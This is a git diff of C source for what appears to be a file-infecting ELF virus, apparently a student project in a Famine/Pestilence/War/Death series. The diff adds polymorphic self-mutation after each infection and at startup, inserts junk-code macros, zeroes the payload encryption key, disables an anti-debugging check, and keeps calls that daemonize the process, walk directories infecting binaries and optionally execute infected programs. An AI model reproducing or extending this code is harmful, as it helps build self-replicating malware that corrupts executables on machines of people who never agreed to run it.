@@ -6,7 +6,6 @@
 #include <elf.h>
 #include <dirent.h>
 
-
 #include "map.h"
 #include "utils.h"
 #include "bss.h"
@@ -15,10 +14,10 @@
 #include "war.h"
 #include "daemon.h"
 #include "famine.h"
+#include "death.h"
 #include "syscall.h"
 
 #define __asm__ __asm__ volatile
-
 
 extern void end();
 
@@ -44,7 +43,11 @@ void __attribute__((naked)) _start(void)
 	);
 }
 
+__attribute__((section(".text#"))) int g_start_offset = 0x1000;
+
 static int	patch_new_file(t_data *data, const char *filename) {
+
+	JUNK;
 
 	unlink(filename);
 
@@ -62,7 +65,7 @@ static int	patch_new_file(t_data *data, const char *filename) {
 	return 0;
 }
 
-static int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
+static inline int64_t calc_jmp(uint64_t from, uint64_t to, uint64_t offset) {
 	return (int64_t)to - (int64_t)from - (int64_t)offset;
 }
 
@@ -101,8 +104,8 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 
 	patch->virus_offset = addr_diff;
 
-	patch->key = gen_key_64();
-	//patch->key = 0;
+	//patch->key = DEFAULT_KEY;
+	patch->key = 0;
 }
 
 static int packer_patch(t_data *data) {
@@ -280,6 +283,7 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 
 				if (infect(new_path, bs_data) == 0) {
 					(*counter)++;
+					mutate();
 
 #ifdef ENABLE_EXEC
 					execute_prog(new_path, bs_data->envp);
@@ -297,7 +301,6 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 	}
 
 	close(fd);
-
 }
 
 void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
@@ -321,16 +324,19 @@ void	entrypoint(int argc, char **argv, char **envp)
 	bootstrap_data.argc = argc;
 	bootstrap_data.argv = argv;
 	bootstrap_data.envp = envp;
-
 	uint16_t counter = 0;
 
 #ifndef DEV_MODE
-	if (pestilence() != 0) {
-		return ;
-	}
+	//if (pestilence() != 0) {
+	//	return ;
+	//}
 #endif
+
+	prepare_mutate();
+	mutate();
 
 	daemonize(envp);
 	famine(&bootstrap_data, &counter);
 	war(counter);
+	//death(&view);
 }
